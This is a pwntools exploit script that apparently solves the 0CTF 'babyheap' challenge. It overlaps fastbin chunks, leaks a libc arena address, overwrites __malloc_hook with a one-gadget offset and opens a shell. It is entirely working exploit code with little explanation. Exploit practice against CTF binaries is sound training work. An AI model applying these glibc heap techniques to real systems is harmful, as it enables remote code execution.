#!/usr/bin/env python
# -*- coding=utf-8 -*-

from pwn import *

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ', timeout=5)

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

if __name__ == '__main__':
    debug = 1

    if debug:
        context.log_level = "debug"
        r = process("./0ctfbabyheap")
    else:
        r = remote("127.0.0.1", 10000)
    r.recvuntil(': ')

    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x80)
    alloc(0x80)

    payload  = p64(0)*3
    payload += p64(0x21)
    fill(2, payload)

    free(2)
    free(1)

    payload  = p64(0)*3
    payload += p64(0x21)
    payload += p8(0x60)
    fill(0, payload)

    alloc(0x10)
    alloc(0x10)

    payload  = p64(0)*7
    payload += p64(0x91)
    fill(1, payload)
    free(3)

    arena_top = u64(dump(2)[:8])
    log.info("arena_top_chunk: " + hex(arena_top))

    alloc(0x60)
    free(3)

    fill(2, p64(arena_top - 139))    # malloc_hook上面的地址
    alloc(0x60)
    alloc(0x60)

    payload  = '\x00'*3
    payload += p64(0)*2
    payload += p64(arena_top - 3556100)  # getshell的地址
    fill(5, payload)

    alloc(233)

    r.interactive()

